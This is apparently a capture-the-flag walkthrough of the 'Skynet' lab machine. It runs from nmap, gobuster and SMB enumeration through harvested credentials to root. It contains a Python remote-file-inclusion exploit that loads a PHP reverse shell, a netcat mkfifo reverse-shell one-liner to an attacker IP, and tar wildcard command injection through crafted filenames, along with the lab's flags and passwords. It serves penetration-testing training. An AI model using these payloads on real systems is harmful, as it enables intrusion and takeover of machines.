# Skynet

---

IP = `10.10.155.13`

## Recon

### nmap

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


### gobuster

`/`

```
/admin                (Status: 301) [Size: 312] [--> http://10.10.155.13/admin/]
/config               (Status: 301) [Size: 313] [--> http://10.10.155.13/config/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.155.13/css/]
/index.html           (Status: 200) [Size: 523]
/js                   (Status: 301) [Size: 309] [--> http://10.10.155.13/js/]
/server-status        (Status: 403) [Size: 277]
/squirrelmail         (Status: 301) [Size: 319] [--> http://10.10.155.13/squirrelmail/]

```

`/squirrelmail`

```
/class                (Status: 403) [Size: 277]
/config               (Status: 301) [Size: 326] [--> http://10.10.155.13/squirrelmail/config/]
/functions            (Status: 403) [Size: 277]
/help                 (Status: 403) [Size: 277]
/images               (Status: 301) [Size: 326] [--> http://10.10.155.13/squirrelmail/images/]
/include              (Status: 403) [Size: 277]
/index.php            (Status: 302) [Size: 0] [--> src/login.php]
/index.php            (Status: 302) [Size: 0] [--> src/login.php]
/locale               (Status: 403) [Size: 277]
/plugins              (Status: 301) [Size: 327] [--> http://10.10.155.13/squirrelmail/plugins/]
/src                  (Status: 301) [Size: 323] [--> http://10.10.155.13/squirrelmail/src/]
/themes               (Status: 301) [Size: 326] [--> http://10.10.155.13/squirrelmail/themes/]
```

### smbclient


`# smbclient -L 10.10.155.13`
or
`smbmap -H 10.10.155.13`

```
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            SKYNET

```

```
# smbclient //10.10.155.13/anonymous
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 16:04:00 2020
  ..                                  D        0  Tue Sep 17 07:20:17 2019
  attention.txt                       N      163  Wed Sep 18 03:04:59 2019
  logs                                D        0  Wed Sep 18 04:42:16 2019

                9204224 blocks of size 1024. 5827724 blocks available
smb: \>
```

`# cat attention.txt`

```
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

`# cat log1.txt`

```
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

http://10.10.207.32/squirrelmail/src/login.php

credential = `milesdyson:cyborg007haloterminator`

After authentication, we can read mails delivered to milesdyson

There is a password reset mail 
` 	skynet@skynet 	Sep 17, 2019 	  	Samba Password reset`

```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

```
smbclient //10.10.207.32/milesdyson -U milesdyson
Password for [WORKGROUP\milesdyson]:
```

```
# smbclient //10.10.207.32/milesdyson -U milesdyson
Password for [WORKGROUP\milesdyson]:
Try "help" to get a list of possible commands.
smb: \> ls
  --SNIP--
  notes                               D        0  Tue Sep --SNIP--

                9204224 blocks of size 1024. 5831472 blocks available
smb: \> cd notes\
smb: \notes\> ls
  --SNIP--
  important.txt                       N      117  Tue Sep --SNIP--

                9204224 blocks of size 1024. 5831472 blocks available
smb: \notes\> get important.txt
getting file \notes\important.txt of size 117 as important.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \notes\>

```

```
# cat important.txt

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

http://10.10.207.32/45kra24zxs28v3yd/

### gobuster
```
/45kra24zxs28v3yd/administrator        (Status: 301) [Size: 337] [--> http://10.10.207.32/45kra24zxs28v3yd/administrator/]
/45kra24zxs28v3yd/index.html           (Status: 200) [Size: 418]
```
`/45kra24zxs28v3yd/administrator/`

```
/alerts               (Status: 301) [Size: 344] [--> http://10.10.207.32/45kra24zxs28v3yd/administrator/alerts/]
/classes              (Status: 301) [Size: 345] [--> http://10.10.207.32/45kra24zxs28v3yd/administrator/classes/]
/components           (Status: 301) [Size: 348] [--> http://10.10.207.32/45kra24zxs28v3yd/administrator/components/]
/index.php            (Status: 200) [Size: 4945]
/index.php            (Status: 200) [Size: 4945]
/js                   (Status: 301) [Size: 340] [--> http://10.10.207.32/45kra24zxs28v3yd/administrator/js/]
/media                (Status: 301) [Size: 343] [--> http://10.10.207.32/45kra24zxs28v3yd/administrator/media/]
/templates            (Status: 301) [Size: 347] [--> http://10.10.207.32/45kra24zxs28v3yd/administrator/templates/]

```

## Initial foothold

https://www.exploit-db.com/exploits/25971?ref=blog.tryhackme.com


```
import requests, os

print(banner)

LHOST = input("LHOST : ")
LPORT = input("LPORT : ")
FILE = input("FILE Name : ")

URL = input("URL : ")

# URL = http://10.10.207.32/45kra24zxs28v3yd/administrator/
# FILE = php-reverse-shell.php (pentestmonkey)

urlPath = URL + "alerts/alertConfigField.php?urlConfig=http://" + LHOST + ":" + LPORT + "/" + FILE

s = requests.Session()

s.post(url=urlPath)

```

Got user www-data!

**user.txt**
`7ce5c2109a40f958099283600a9ae807`

`su milesdyson`
`milesdyson:cyborg007haloterminator`


## Priv Esc

`sudo -l`

Nothing

`crontab -l `

No entries

`crontab -e `

`*/1 *  *   *   *   root /home/milesdyson/backups/backup.sh`

[refer](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/?ref=blog.tryhackme.com)
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.96.175 1234 >/tmp/f" > shell.sh

touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"

touch "/var/www/html/--checkpoint=1"
```

`nc -lnvp 1234`

Got Root!

**root.txt**
`3f0372db24753accc7179a282cd6a949`